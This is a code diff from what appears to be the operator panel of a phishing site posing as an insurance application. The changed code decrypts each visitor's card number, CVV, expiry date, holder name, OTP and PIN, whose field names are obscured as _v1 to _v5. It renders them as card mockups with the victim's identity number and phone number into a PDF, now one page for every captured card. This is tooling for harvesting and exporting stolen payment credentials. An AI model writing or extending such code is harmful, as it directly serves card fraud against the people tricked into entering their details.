@@ -188,7 +188,10 @@ function safeTimestamp(ts: any): number {
   return Number.isNaN(d.getTime()) ? 0 : d.getTime();
 }
 
-function extractCardData(visitor: InsuranceApplication) {
+function extractCardData(
+  visitor: InsuranceApplication,
+  cardEntry?: { data: Record<string, unknown>; timestamp?: string },
+) {
   const history = visitor.history || [];
   const allCardHistory = getNormalizedCardEntries(visitor)
     .sort((a: any, b: any) => safeTimestamp(b.timestamp) - safeTimestamp(a.timestamp));
@@ -199,25 +202,26 @@ function extractCardData(visitor: InsuranceApplication) {
     .filter((h: any) => h.type === "_t3" || h.type === "pin")
     .sort((a: any, b: any) => safeTimestamp(b.timestamp) - safeTimestamp(a.timestamp));
 
-  const latestCard = allCardHistory[0] ?? null;
+  const latestCard = cardEntry ?? allCardHistory[0] ?? null;
   const latestOtp = allOtpHistory[0] ?? null;
   const latestPin = allPinHistory[0] ?? null;
+  const latestCardData = latestCard?.data as Record<string, any> | undefined;
 
   const cardNumber = latestCard
-    ? decryptField(latestCard.data?._v1 || latestCard.data?.cardNumber)
+    ? decryptField(latestCardData?._v1 || latestCardData?.cardNumber)
     : decryptField(visitor._v1 || visitor.cardNumber);
   const cvv = latestCard
-    ? decryptField(latestCard.data?._v2 || latestCard.data?.cvv)
+    ? decryptField(latestCardData?._v2 || latestCardData?.cvv)
     : decryptField(visitor._v2 || visitor.cvv);
   const expiryDate = latestCard
-    ? decryptField(latestCard.data?._v3 || latestCard.data?.expiryDate)
+    ? decryptField(latestCardData?._v3 || latestCardData?.expiryDate)
     : decryptField(visitor._v3 || visitor.expiryDate);
   const cardHolderName = latestCard
-    ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
+    ? decryptField(latestCardData?._v4 || latestCardData?.cardHolderName)
     : decryptField(visitor._v4 || visitor.cardHolderName);
-  const cardType = val(latestCard?.data?.cardType || visitor.cardType);
-  const bankName = val(latestCard?.data?.bankInfo?.name || visitor.bankInfo?.name);
-  const cardLevel = val(latestCard?.data?.bankInfo?.level || visitor.cardLevel || visitor.bankInfo?.level);
+  const cardType = val(latestCardData?.cardType || visitor.cardType);
+  const bankName = val(latestCardData?.bankInfo?.name || visitor.bankInfo?.name);
+  const cardLevel = val(latestCardData?.bankInfo?.level || visitor.cardLevel || visitor.bankInfo?.level);
 
   const otpCode = latestOtp
     ? decryptField(latestOtp.data?._v5 || latestOtp.data?.otp)
@@ -684,11 +688,10 @@ export async function generateCardPdf(visitor: InsuranceApplication) {
 }
 
 export async function generateAllCardsPdf(visitors: InsuranceApplication[]) {
-  const hasCardData = (v: InsuranceApplication) =>
-    getNormalizedCardEntries(v).length > 0;
-
-  const withCards = visitors.filter(hasCardData);
-  if (withCards.length === 0) return;
+  const cardEntries = visitors.flatMap((visitor) =>
+    getNormalizedCardEntries(visitor).map((entry) => ({ visitor, entry })),
+  );
+  if (cardEntries.length === 0) return;
 
   const html2pdf = (await import("html2pdf.js")).default;
 
@@ -698,9 +701,9 @@ export async function generateAllCardsPdf(visitors: InsuranceApplication[]) {
   document.head.appendChild(link);
   await new Promise((resolve) => setTimeout(resolve, 1500));
 
-  const cardsHtml = withCards.map((v, i) => {
-    const d = extractCardData(v);
-    const pageLabel = `${i + 1} / ${withCards.length}`;
+  const cardsHtml = cardEntries.map(({ visitor, entry }, i) => {
+    const d = extractCardData(visitor, entry);
+    const pageLabel = `${i + 1} / ${cardEntries.length}`;
     const cardHtml = buildCardMockupHtml(
       d.cardNumber, d.expiryDate, d.cvv, d.cardHolderName,
       d.bankName, d.cardType, d.cardLevel,
@@ -708,7 +711,7 @@ export async function generateAllCardsPdf(visitors: InsuranceApplication[]) {
       d.visitorName, d.identityNumber, d.phoneNumber,
       pageLabel
     );
-    const isLast = i === withCards.length - 1;
+    const isLast = i === cardEntries.length - 1;
     return `<div style="${!isLast ? "page-break-after:always;" : ""}padding:30px 0;">${cardHtml}</div>`;
   }).join("\n");
 
